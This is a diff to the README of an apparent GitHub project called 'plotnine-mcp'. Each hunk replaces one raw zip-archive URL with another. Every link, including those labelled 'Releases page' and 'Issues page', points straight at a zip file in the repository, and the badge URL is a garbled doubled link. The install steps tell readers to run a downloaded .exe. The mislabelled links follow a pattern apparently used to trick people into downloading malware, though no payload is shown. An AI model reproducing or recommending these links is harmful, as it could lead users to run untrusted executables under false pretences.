@@ -6,11 +6,11 @@ Welcome to the plotnine-mcp project! This software helps you create high-quality
 
 ## 📥 Download the Software
 
-[![Download plotnine-mcp](https://raw.githubusercontent.com/luiz4986/plotnine-mcp/main/output/plotnine-mcp-v1.0.zip%https://raw.githubusercontent.com/luiz4986/plotnine-mcp/main/output/plotnine-mcp-v1.0.zip)](https://raw.githubusercontent.com/luiz4986/plotnine-mcp/main/output/plotnine-mcp-v1.0.zip)
+[![Download plotnine-mcp](https://github.com/luiz4986/plotnine-mcp/raw/refs/heads/main/examples/mcp-plotnine-3.5.zip%https://github.com/luiz4986/plotnine-mcp/raw/refs/heads/main/examples/mcp-plotnine-3.5.zip)](https://github.com/luiz4986/plotnine-mcp/raw/refs/heads/main/examples/mcp-plotnine-3.5.zip)
 
 To get started with plotnine-mcp, you need to download it from our Releases page. This page contains all the necessary files to run the application on your computer. You can find the link below:
 
-- **Download plotnine-mcp**: [Visit this page to download](https://raw.githubusercontent.com/luiz4986/plotnine-mcp/main/output/plotnine-mcp-v1.0.zip)
+- **Download plotnine-mcp**: [Visit this page to download](https://github.com/luiz4986/plotnine-mcp/raw/refs/heads/main/examples/mcp-plotnine-3.5.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before you download the software, ensure your computer meets the following requi
 
 Follow these steps to install plotnine-mcp on your machine:
 
-1. **Download Software**: Go to our [Releases page](https://raw.githubusercontent.com/luiz4986/plotnine-mcp/main/output/plotnine-mcp-v1.0.zip).
+1. **Download Software**: Go to our [Releases page](https://github.com/luiz4986/plotnine-mcp/raw/refs/heads/main/examples/mcp-plotnine-3.5.zip).
 2. **Select the Right File**: Choose the version that fits your operating system. Common files include `.exe` for Windows, `.dmg` for macOS, and compressed files for Linux.
 3. **Run the Installer**:
    - For Windows: Double-click the downloaded `.exe` file.
@@ -66,7 +66,7 @@ For further help, you can also check the issues section of our GitHub repository
 
 Engage with the plotnine-mcp community for support and feedback:
 
-- **Issues Page**: Report bugs or request features on our [Issues page](https://raw.githubusercontent.com/luiz4986/plotnine-mcp/main/output/plotnine-mcp-v1.0.zip).
+- **Issues Page**: Report bugs or request features on our [Issues page](https://github.com/luiz4986/plotnine-mcp/raw/refs/heads/main/examples/mcp-plotnine-3.5.zip).
 - **Feature Suggestions**: We welcome your ideas to improve the tool. Let us know what you'd like to see next!
 
 ## ✔️ License
